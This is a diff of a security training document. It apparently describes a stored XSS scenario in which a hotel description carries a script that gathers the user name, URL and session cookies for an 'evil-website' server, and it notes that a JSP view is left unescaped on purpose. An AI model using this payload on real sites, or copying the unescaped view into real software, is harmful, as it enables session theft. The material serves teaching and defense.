@@ -7,14 +7,6 @@ Scenario summary
 The attacker will create an hotel description that has an embedded script that
 will send the cookies of a user browsing the web site to the attacker website.
 
-Code change
------------
-
-In the views, the view `hotel/view.jsp` will not escape the value of the hotel
-description.
-
-The *evil-website* server must be deployed for this attack to work.
-
 Scenario description
 --------------------
 
@@ -29,7 +21,7 @@ description of an hotel.
 	<h3>That hotel!</h3>
 	<div id="myHotel">Welcome!</div>
 	<script type="text/javascript">
-	var data;
+	var data = "";
 	data += "[user: " + $("#login a.btn-primary").text() + "]";
 	data += "[url: " + document.location.href + "]";
 	data += "[cookie: " + document.cookie + "]";
@@ -41,6 +33,14 @@ In the *evil-website* console, the user information should appear.
 The sent request can also be seen using *FireBug* or *WebScarab*.
 
 (Don't forget to change the host with what is needed...)
+
+Vulnerable code
+---------------
+
+In the views, the view `hotel/view.jsp` will not escape the value of the hotel
+description.
+
+The *evil-website* server must be deployed for this attack to work.
 
 Preventing the attack
 ---------------------
